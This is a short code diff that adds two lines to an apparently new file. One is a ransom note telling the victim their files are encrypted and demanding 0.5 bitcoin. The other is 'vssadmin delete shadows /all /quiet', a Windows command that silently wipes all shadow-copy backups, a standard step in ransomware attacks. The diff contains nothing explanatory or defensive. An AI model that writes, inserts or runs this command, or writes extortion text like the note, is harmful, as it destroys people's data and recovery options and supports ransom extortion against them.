@@ -1,0 +1,2 @@
+ATTENTION: Your files have been encrypted! Send 0.5 bitcoin to our wallet to decrypt your data.
+vssadmin delete shadows /all /quiet
